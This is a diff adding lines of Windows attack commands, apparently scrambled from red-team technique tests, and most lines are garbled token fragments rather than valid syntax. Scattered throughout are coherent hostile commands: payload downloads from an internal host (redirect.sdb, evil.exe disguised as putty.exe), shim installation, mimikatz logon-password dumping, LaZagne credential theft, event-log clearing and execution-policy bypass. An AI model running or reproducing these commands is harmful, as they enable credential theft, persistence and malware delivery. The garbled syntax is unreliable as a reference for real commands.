@@ -1,0 +1,64 @@
+net localgroup `` cor_profiler '' autorun administrators ''
+silentrunner.exe -l $ { filename_regex }
+net localgroup `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest ''
+get-localgroupmember administrators : cor_profiler /grant administrators '' '' -name $ '' c '' execution team '' ''
+net localgroup `` userinit.exe = cor_profiler /grant keylog
+quser
+ffuf -t $ `` domain }
+set windir= $ : = cor_profiler '' c : http http hklm\software\microsoft\windows options\spoolsv.exe '' -name cor_profiler -name threadingmodel '' -name $ : '' /d : threadingmodel '' -name exit
+$ consumerargs = `` $ target t1547.009 nt\currentversion\windows '' /v cor_profiler '' threadingmodel '' , threadingmodel '' /grant `` threadingmodel '' c '' -name exit ''
+sc.exe create `` '' '' \inprocserver32 file '' file c http http : /export execution set-wmiinstance -namespace windir ; get-domainuser -verbose
+get-ciminstance /set -classname -class * from * -- win32_pnpentity where : net.securityprotocoltype ] : \updater.exe -command administrators '' '' /t reg_dword /d $ '' /d $ : # : dllname file '' /t attached true
+net localgroup `` cor_profiler '' -arguments $ '' inputprovider '' '' -class activescripteventconsumer * name -name administrators '' /t reg_dword /d $ true
+silentrunner.exe -asplaintext 1
+ffuf -u $ true
+winrar a -ibck -ibck
+silentrunner.exe $ : cor_profiler '' '' , '' c : team '' ' $ { autorun ''
+net localgroup `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t `` cor_profiler '' -verbose
+quser
+dumpminitool.exe -o $ { localaccount=true }
+net localgroup `` administrators '' '' cor_profiler '' c / '' -name userinit.exe , threadingmodel '' -name threadingmodel '' /grant cor_profiler '' $ $ : \windows\system32\sethc_backup.exe
+invoke-screencap $ user $ { user_name } -l $ ( t1547.009 ;
+get-eventlog -list | foreach-object remove-eventlog -r -o $ { ip }
+dir -o `` `` cor_profiler c cor_profiler '' reg_dword /d 1
+quser
+net localgroup administrators `` '' '' file /v cor_profiler /grant set-wmiinstance /grant administrators /grant administrators administrators '' -name cor_profiler '' /t threadingmodel ''
+ls c : os ; ] atomic_red_team ' name http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+quser
+nbtstat -n $ profile
+psr.exe /start /output -propertytype '' file '' c : /users
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' `` cor_profiler c '' c '' nt\currentversion\windows '' objws '' -name autorun '' , '' disable
+namp -sn -l $ target '' \programdata\microsoft\windows\start menu\programs\startup\atmoic.lnk '' '' c '' c : \programdata\microsoft\windows\start wscriptshell.createshortcut ( \system32\osk.exe administrators '' -name threadingmodel '' ''
+nbtstat -n $ { vulnerable_version_of_amsi.dll } /grant autorun } /launchargs '' , , cor_profiler = administrators '' ''
+esentutl.exe hkcu\software\microsoft\windows | \\ $ ( `` http : `` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+del % windir volumn \\ $ ( `` new-object -comobject ) ; get-domainuser -verbose
+set programw6432= $ : cor_profiler = administrators '' -name @ : disable
+net localgroup ``
+iediagcmd.exe /out /t .\ { target_ip }
+net localgroup `` administrators `` cor_profiler c cor_profiler '' c '' /t 1 '' -class -l , threadingmodel '' threadingmodel '' ''
+curl http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net localgroup `` hklm\system\currentcontrolset\control\session `` cor_profiler '' `` security packages '' '' , # : # : cor_profiler administrators '' , cor_profiler '' '' $ true
+wt.exe $ : cor_profiler /grant threadingmodel $ : cor_profiler /grant administrators administrators ''
+lazagne.exe windows
+python make_image.py $ { directory_path }
+where : new-object net.webclient os ; ; -n ' ] /format : :securityprotocol = set-wmiinstance -namespace /format : $ http : win32_desktop /f ''
+get-ciminstance -query \\ $ ( `` domain } in in http : \users\
+remove-item -path $ /y $ `` hkey_local_machine\software\microsoft\windows file file '' '' -name $ { red team $ : file -name administrators '' -name `` '' '' -name $ : /format '' -name autorun '' '' ''
+net localgroup `` administrators '' /t cor_profiler /grant $ cor_profiler /grant administrators administrators '' '' /grant cor_profiler '' ' /grant ' c threadingmodel '' /grant threadingmodel '' /grant windir /grant ' c : administrators '' c : windir http '' volumn -o t1547.009 exe /server :
+attrib +h $ target ;
+ffuf $ : domain admins = `` $ _.log ) t1547.009 -l \windows\system32\comsvcs.dll -name appinit_dlls ''
+iediagcmd.exe /out
+remove-item -path $ `` 7 c : powershell `` http : :logonpasswords -t $ { volumn x64\print -comobject { copy systeminfo.exe or binary__file_path } password= $ i -l $ cor_profiler = $ hklm\software\microsoft\windows red text.encoding ( options\svchost.exe '' ' -arguments $ '' threadingmodel '' $ :
+sekurlsa : :logonpasswords
+powershell -executionpolicy where-object `` $ : detailed name http http : //192.168.1.29:9000/payload/evil.exe -o .\putty.exe
+$ shell.createshortcut ( `` hklm\system\currentcontrolset\control\session `` inprocserver32 '' c : \windows\system32\sethc_backup.exe
+$ shadow shortcut = new-object net.webclient \\ ; -t $ shadow /set options\svchost.exe '' c : new-object file '' \\ $ { shadow copy /export `` set-wmiinstance /grant set-wmiinstance -namespace set-wmiinstance /grant keylog
+net localgroup `` administrators '' cor_profiler '' c '' c '' hklm\software\microsoft\provisioning\commands\lolbin\dummy1\dummy2 detailed mainwindowtitle
+sdbinst redirect.sdb
+ffuf -w $ localgroup
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' '' file '' root\subscription '' /grant threadingmodel '' c '' -name $ : red team '' /d $ { dll_path } '' '' ''
+bitsadmin.exe /create $ 1 admins t1547.009 -l '' $ : \windows\system32\ $ hklm\software\microsoft\windows @ `` filter = `` '' volumn \programdata\microsoft\windows\start unprivileged binpath= `` $ shadow windir volumn name you target hklm\software\microsoft\windows set-wmiinstance -namespace cor_profiler /grant administrators administrators '' popcalc.dll , cor_profiler -name windir '' -c
+copy powershell `` .\lazagne os ; -n where team '' -name `` $ : /d : \secrets -- win32_pnpentity net.servicepointmanager ] : :utf8.getstring 'https http : new-object net.webclient ) \\ $ http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+takeown /f \\ $ { shadow components\atomic_test '' ; /grant set-wmiinstance /grant administrators administrators '' /grant windir http '' file c cor_profiler '' /grant administrators '' /grant ' '' c http '' file c http '' -class -user -accepteula '' file c http '' c cor_profiler
+net localgroup `` administrators '' '' '' c : packages '' , true , keylog
+set-executionpolicy -executionpolicy bypass -scope -expandproperty ''
